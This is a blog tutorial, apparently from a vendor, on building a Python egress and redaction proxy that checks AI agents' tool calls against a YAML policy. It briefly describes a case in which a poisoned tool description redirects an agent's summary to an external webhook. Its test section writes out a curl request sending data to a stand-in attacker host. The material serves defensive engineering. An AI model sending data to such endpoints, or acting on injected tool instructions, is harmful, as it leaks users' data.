---
title: "Stop Data Exfiltration by AI Agents: Build a Redaction and Egress Proxy for Tool Calls"
description: >-
  Learn AI agent security best practices by building a redaction and egress proxy that inspects tool calls, blocks data exfiltration, and logs every decision.
image: /img/blogs/stop-data-exfiltration-by-ai-agents-build-a-redaction-and-egress-proxy-for-tool-calls.webp
layout: post
permalink: /blog/:title/
author: Shyam Mohan
category: AIML
date: 2026-11-10T00:00:00.000Z
---

<!-- keywords: ai agent security best practices, ai agent security threats, ai agent security infrastructure, prevent data exfiltration ai agents, ai agent tool call security, ai agent egress proxy, llm agent data loss prevention, ai agent least privilege access -->

> **Quick Answer / TL;DR**
> AI agents exfiltrate data through the same tool calls they use to do useful work. The durable fix is not a better system prompt — it is an enforced boundary between the agent and every external provider. Put a policy-aware egress proxy in front of tool calls, bind each call to a delegated identity, redact sensitive fields before they leave, and fail closed when policy cannot be evaluated. This guide shows how to build that proxy in Python, wire it to a YAML policy, test it against real exfiltration patterns, and produce audit evidence.

AI agent security best practices begin with a simple admission: an agent with broad tool access is a data movement system with a natural-language control plane. It can read a CRM record, summarize it, and POST the result to an endpoint — all in one reasoning step, with no human in the loop. This tutorial walks through building a redaction and egress proxy that sits between the agent runtime and every tool, API, or connector it calls. You will implement policy checks, field-level redaction, approval gates, and an evidence trail you can review after an incident.

## What You Will Learn

- How to map the AI agent attack surface across identity, prompts, memory, tools, connectors, credentials, data, and multi-step execution.
- How to design an authorization and policy boundary that every tool call must cross.
- How to implement a Python egress proxy with redaction, domain allowlists, least-privilege scoping, and fail-closed behavior.
- How to test exfiltration scenarios and monitor decisions without collecting sensitive payloads.
- How to produce governance evidence for audits and respond when a control fails.

## Table of Contents

- [Why AI Agent Security Best Practices Start With Egress](#why-ai-agent-security-best-practices-start-with-egress)
- [Map the AI Agent Attack Surface](#map-the-ai-agent-attack-surface)
- [Reference Architecture: Policy Boundary Before Provider Access](#reference-architecture-policy-boundary-before-provider-access)
- [Six Controls: Implementing AI Agent Security Best Practices](#six-controls-implementing-ai-agent-security-best-practices)
- [Build the Redaction and Egress Proxy Step by Step](#build-the-redaction-and-egress-proxy-step-by-step)
- [Test, Monitor, and Prove the Proxy Works](#test-monitor-and-prove-the-proxy-works)
- [Governance, Audit Evidence, and Incident Response](#governance-audit-evidence-and-incident-response)
- [Frequently Asked Questions](#frequently-asked-questions)
- [Further Reading](#further-reading)

## Why AI Agent Security Best Practices Start With Egress

Most agent security advice focuses on the input side: prompt injection, jailbreaks, and malicious instructions hidden in retrieved documents. Those are real AI agent security threats, but they describe how an attacker gets control. Exfiltration describes what the agent does next, and it looks almost identical to normal work.

Consider a support agent asked to "summarize open tickets and share context with the escalation channel." A compromised tool description could redirect that summary to an external webhook. Nothing in the prompt looks unusual. The outbound HTTP request looks like any other API call. If your only control is a model-level guardrail, you are asking the same system that was manipulated to detect the manipulation.

Egress control flips the trust model. The agent proposes an action; a separate component decides whether that action is allowed, what data it may contain, and which identity it runs under. That separation is what makes the control auditable and testable. Everything that follows builds on this idea.

## Map the AI Agent Attack Surface

Before writing rules, enumerate what an agent can touch. Teams that skip this step usually build a proxy that inspects the prompt but leaves credentials, connectors, and multi-step flows wide open.

| Surface | Example risk | Primary control |
|---|---|---|
| Identity | Agent uses a shared service account | Delegated identity bound to the requesting user |
| Prompts | Injected instructions change tool behavior | Treat retrieved content as untrusted data |
| Memory | Poisoned context persists across sessions | Scoped memory with provenance and expiry |
| Tools | Overly broad tool descriptions or scopes | Capability allowlist per task |
| Connectors | Third-party OAuth grants never expire | Exact resource-bound grants and revocation |
| Credentials | Long-lived secrets inside the agent runtime | Just-in-time credentials held outside the runtime |
| Data | Sensitive fields returned in full | Field-level minimization and redaction |
| Multi-step execution | Individually harmless calls combine into a leak | Session-level budgets and correlation |

The last row is the one teams underestimate. A single call that returns 5 records may be permitted. Forty sequential calls that each return 5 records is a bulk export. Your policy needs to reason about the session, not just the request. With the surface mapped, you can place a boundary that sees every hop.

## Reference Architecture: Policy Boundary Before Provider Access

The architecture has four parts: the agent runtime, a policy decision point, a credential broker, and the provider. The agent never talks to a provider directly. It sends a structured tool request to the proxy, which resolves identity, evaluates policy, obtains a scoped credential if allowed, performs the call, redacts the response, and writes an evidence record.

```text
Agent runtime
    |  tool request: {agent_id, user_id, tool, args}
    v
Egress proxy  --->  Policy decision point (allow | deny | require approval)
    |                        |
    |                        +--> Audit log (decision + hash, not payload)
    |  scoped credential
    v
Credential broker (JIT, short TTL, resource-bound)
    |
    v
Provider API / MCP server / connector
    |
    v
Redaction + result protection ---> back to agent
```

Two properties matter more than the specific product you use. First, the policy decision happens **before** credential issuance, so a denied call cannot obtain access even momentarily. Second, the credential is bound to a specific resource and short-lived, so a leaked token has a narrow blast radius.

This is the general pattern behind governed-gateway products, including Axec, which frames it as distinct agent identity bound to the requesting human, delegated OAuth grants, policy decisions that allow, deny, or require scoped approval, and JIT credentials kept outside the agent runtime. You can implement the same shape with open-source components and your existing identity provider. The architecture matters more than the vendor.

## Six Controls: Implementing AI Agent Security Best Practices

These controls are cumulative. Skipping one usually creates the gap an attacker needs.

1. **Least privilege per task.** Give the agent a capability set for the current job, not the union of everything it might need. A research agent gets read scopes; a ticketing agent gets one project.
2. **Delegated identity.** Every call carries both the agent identity and the human on whose behalf it acts. If you cannot answer "who is this for," deny the call.
3. **Just-in-time access.** Issue credentials at call time with a short TTL and an audience restricted to the target resource. Keep refresh tokens out of the agent runtime entirely.
4. **Approval checkpoints.** Route high-impact actions — bulk exports, external sends, permission changes — to a human approver with a scoped, time-boxed grant rather than a blanket yes.
5. **Input and output protection.** Validate tool arguments against a schema, strip instructions from retrieved content, and redact sensitive fields in responses before the model sees them.
6. **Fail-closed behavior.** If the policy engine times out, the identity lookup fails, or the schema is unknown, the call is denied. Never default to allow because a dependency is down.

Notice that five of the six controls live outside the model. That is deliberate. Controls inside the prompt can be argued with; controls outside it cannot. Now let's implement them.

## Build the Redaction and Egress Proxy Step by Step

We will build a small FastAPI service that evaluates a YAML policy, redacts text, enforces an egress allowlist, and records an audit event. In production, place it behind your normal service authentication and connect the credential broker to your identity provider.

**Step 1 — Define policy as data, not code.**

```yaml
# policy.yaml
version: 1
default: deny
rules:
  - id: crm-read
    match:
      tool: crm.search_contacts
    allow_fields: [id, name, company, owner]
    max_records: 25
  - id: ticket-create
    match:
      tool: jira.create_issue
    require_approval: true
    approvers: [security-oncall]
redaction:
  patterns:
    - name: email
      regex: '[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}'
    - name: api_key
      regex: '(sk|pk)_(live|test)_[A-Za-z0-9]{16,}'
    - name: ssn
      regex: '\b\d{3}-\d{2}-\d{4}\b'
egress:
  allow_domains: [api.internal.example.com, jira.example.com]
  block_private_ranges: true
```

**Step 2 — Implement redaction and egress checks.**

```python
import hashlib
import ipaddress
import json
import re
import socket
from datetime import datetime, timezone
from urllib.parse import urlparse

import yaml

with open("policy.yaml") as f:
    POLICY = yaml.safe_load(f)

PATTERNS = [(p["name"], re.compile(p["regex"])) for p in POLICY["redaction"]["patterns"]]


def redact(value):
    if isinstance(value, dict):
        return {k: redact(v) for k, v in value.items()}
    if isinstance(value, list):
        return [redact(v) for v in value]
    if isinstance(value, str):
        for name, pattern in PATTERNS:
            value = pattern.sub(f"[REDACTED:{name}]", value)
    return value


def check_egress(url: str) -> tuple[bool, str]:
    host = urlparse(url).hostname or ""
    allowed = POLICY["egress"]["allow_domains"]
    if host not in allowed:
        return False, f"domain_not_allowed:{host}"
    try:
        addr = ipaddress.ip_address(socket.gethostbyname(host))
        if POLICY["egress"]["block_private_ranges"] and addr.is_private:
            return False, f"private_address_blocked:{host}"
    except ValueError:
        return False, f"unresolvable_host:{host}"
    return True, "ok"
```

**Step 3 — Evaluate policy before issuing a credential.**

```python
def evaluate(tool: str, args: dict, user_id: str | None):
    if not user_id:
        return {"decision": "deny", "reason": "missing_delegated_identity"}

    rule = next((r for r in POLICY["rules"]
                 if r["match"]["tool"] == tool), None)
    if rule is None:
        return {"decision": "deny", "reason": "no_matching_rule"}

    if rule.get("max_records") and len(args.get("records", [])) > rule["max_records"]:
        return {"decision": "deny", "reason": "record_budget_exceeded"}

    if rule.get("require_approval"):
        return {"decision": "require_approval", "rule": rule["id"]}

    return {"decision": "allow", "rule": rule["id"], "user_id": user_id}
```

**Step 4 — Wrap the call and write evidence.**

```python
def audit(event: dict):
    payload = json.dumps(event, sort_keys=True).encode()
    event["digest"] = hashlib.sha256(payload).hexdigest()
    event["ts"] = datetime.now(timezone.utc).isoformat()
    with open("audit.jsonl", "a") as f:
        f.write(json.dumps(event) + "\n")


def handle_tool_call(request: dict):
    decision = evaluate(request["tool"], request.get("args", {}), request.get("user_id"))
    if decision["decision"] != "allow":
        audit({"tool": request["tool"], "decision": decision})
        return {"status": "blocked", "reason": decision["reason"]}

    url = request["args"].get("endpoint", "")
    ok, reason = check_egress(url)
    if not ok:
        audit({"tool": request["tool"], "decision": "deny", "reason": reason})
        return {"status": "blocked", "reason": reason}

    # Credential broker issues a short-lived, resource-bound token here.
    raw_result = call_provider(url, request["args"], token=request["jit_token"])
    safe_result = redact(raw_result)
    audit({"tool": request["tool"], "decision": "allow",
           "rule": decision["rule"], "user_id": decision["user_id"]})
    return {"status": "ok", "data": safe_result}
```

**Step 5 — Deny by default when dependencies fail.**

```python
def safe_evaluate(*args, **kwargs):
    try:
        return evaluate(*args, **kwargs)
    except Exception:
        return {"decision": "deny", "reason": "policy_engine_unavailable"}
```

That single wrapper prevents the most common production failure: an outage in the policy service that silently converts every rule into "allow." With the proxy assembled, the next question is whether it actually stops the attacks you care about.

## Test, Monitor, and Prove the Proxy Works

Write tests for the attacks, not just the happy path. Each case below should return `blocked` with the expected reason.

```bash
# 1. Data smuggling through free-text tool arguments
curl -s -X POST localhost:8080/tool -d '{
  "tool": "crm.search_contacts",
  "user_id": "u_123",
  "args": {"endpoint": "https://api.internal.example.com/crm",
           "records": ["a","b","c","d","e","f","g","h","i","j",
                       "k","l","m","n","o","p","q","r","s","t",
                       "u","v","w","x","y","z"]}
}'
# expect: record_budget_exceeded

# 2. Exfiltration to an unapproved domain
curl -s -X POST localhost:8080/tool -d '{
  "tool": "crm.search_contacts",
  "user_id": "u_123",
  "args": {"endpoint": "https://attacker.example.net/collect"}
}'
# expect: domain_not_allowed
```

Add a unit test for redaction so secrets never appear in logs or responses:

```python
def test_redacts_email_and_keys():
    out = redact({"note": "contact a@b.com key sk_live_ABCDEFGH12345678"})
    assert "a@b.com" not in out["note"]
    assert "sk_live_" not in out["note"]
```

For monitoring, track four metrics per tool: allowed, denied, approval-required, and redaction count. Alert on spikes in denied calls per agent, on any approval request outside business hours, and on session-level record volume above baseline. Store hashes and metadata in the audit log; avoid storing payload bodies, since the audit system should not become the new exfiltration target.

Run these tests in CI whenever a tool schema or policy changes. The proxy is the one place where a one-line policy edit can open or close a data path, so it deserves the same review rigor as authentication code. Once the controls work, the remaining work is proving they work to someone else.

## Governance, Audit Evidence, and Incident Response

Auditors and security reviewers increasingly ask three questions about agents: who authorized this action, what data left the boundary, and how quickly can you revoke access? Design the proxy so each has a direct answer.

- **Authorization evidence.** Log the agent identity, delegated user, policy rule, decision, and timestamp for every call. Keep policy versions under source control so a decision can be replayed against the rule that existed at the time.
- **Data evidence.** Record redaction counts and field names, plus a digest of the response. This shows minimization without retaining the sensitive values themselves.
- **Revocation evidence.** Delegated OAuth grants and JIT credentials should be revocable without redeploying the agent. Test revocation quarterly and record the time from revoke to first denied call.

For incident response, treat an agent as a potentially compromised principal. Revoke its delegated grants, rotate any credentials it could reach, replay the audit trail for the affected window, and check for session-level patterns such as a burst of reads followed by an outbound write. In regulated environments, map these controls to your existing access-review and change-management processes rather than inventing a parallel program, and confirm current obligations with your compliance team — this article does not assert legal or certification guarantees.

Documentation matters here too. A short runbook that names the policy owner, the approval channel, and the revocation procedure is often the difference between a controlled rollback and a multi-day investigation. With controls, tests, and evidence in place, the architecture becomes something you can defend in a review.

## Conclusion: Make Exfiltration Structurally Hard

Data exfiltration by AI agents is not a prompt problem you can solve with better instructions. It is a data-flow problem, and the durable answer is a boundary that every tool call must cross. By applying AI agent security best practices — delegated identity, least privilege, just-in-time credentials, approval checkpoints, response redaction, and fail-closed policy evaluation — you turn an opaque agent into a governed principal whose actions can be allowed, denied, and audited.

Start small: instrument one high-risk tool, add the proxy, and write the three tests that matter — bulk export, unapproved domain, and secret leakage. Then expand the policy as you learn where your agents actually send data. If you want to compare notes on your AI agent security architecture and where the boundary should sit, [book a 30-minute architecture discussion](https://cal.id/axec/demo?duration=30). Bring your tool inventory; that is usually where the conversation gets useful.

## Frequently Asked Questions

### What are the most important AI agent security best practices?

Bind every agent to a delegated human identity, grant least privilege per task, issue just-in-time credentials outside the agent runtime, require approval for high-impact actions, redact sensitive fields in responses, and fail closed when policy cannot be evaluated. These controls live outside the model, so they cannot be talked around by prompt injection.

### What are the main AI agent security threats?

Prompt injection, tool poisoning, over-broad OAuth grants, long-lived credentials in the runtime, poisoned memory, and multi-step data exfiltration. The last one is subtle because each individual call may look benign while the sequence performs a bulk export.

### Do I need an egress proxy if I already use guardrails?

Yes. Guardrails inspect model input and output; they do not control which domains receive data or which credentials are used. An egress proxy enforces decisions at the network and identity layer, which is where exfiltration actually happens.

### What should an AI agent security infrastructure log?

Log the agent identity, delegated user, tool name, policy rule, decision, timestamp, redaction counts, and a digest of the response. Avoid storing raw payloads in the audit system, since it would otherwise become a high-value target itself.

### How do I revoke an AI agent's access quickly?

Use delegated, resource-bound grants and short-lived JIT credentials so revocation does not require redeploying the agent. Keep a runbook with the revocation procedure and test it on a schedule, measuring the time from revoke to the first denied call.

<script type="application/ld+json">
{% raw %}
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {
      "@type": "Question",
      "name": "What are the most important AI agent security best practices?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Bind every agent to a delegated human identity, grant least privilege per task, issue just-in-time credentials outside the agent runtime, require approval for high-impact actions, redact sensitive fields in responses, and fail closed when policy cannot be evaluated."
      }
    },
    {
      "@type": "Question",
      "name": "What are the main AI agent security threats?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Prompt injection, tool poisoning, over-broad OAuth grants, long-lived credentials in the runtime, poisoned memory, and multi-step data exfiltration where each call looks benign but the sequence performs a bulk export."
      }
    },
    {
      "@type": "Question",
      "name": "Do I need an egress proxy if I already use guardrails?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Yes. Guardrails inspect model input and output but do not control which domains receive data or which credentials are used. An egress proxy enforces decisions at the network and identity layer, where exfiltration actually happens."
      }
    },
    {
      "@type": "Question",
      "name": "What should an AI agent security infrastructure log?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Log the agent identity, delegated user, tool name, policy rule, decision, timestamp, redaction counts, and a digest of the response. Avoid storing raw payloads in the audit system."
      }
    },
    {
      "@type": "Question",
      "name": "How do I revoke an AI agent's access quickly?",
      "acceptedAnswer": {
        "@type": "Answer",
        "text": "Use delegated, resource-bound grants and short-lived just-in-time credentials so revocation does not require redeploying the agent. Keep and test a revocation runbook, measuring time from revoke to the first denied call."
      }
    }
  ]
}
{% endraw %}
</script>

## Further Reading

- [OWASP Top 10 for Large Language Model Applications](https://owasp.org/www-project-top-10-for-large-language-model-applications/) — a widely used taxonomy of LLM risks, including excessive agency and sensitive information disclosure.
- [NIST AI Risk Management Framework](https://www.nist.gov/itl/ai-risk-management-framework) — a governance structure for mapping, measuring, and managing AI risk that fits well with agent access reviews.
- [Model Context Protocol specification](https://modelcontextprotocol.io/specification) — useful for understanding the tool and connector boundary your proxy needs to mediate.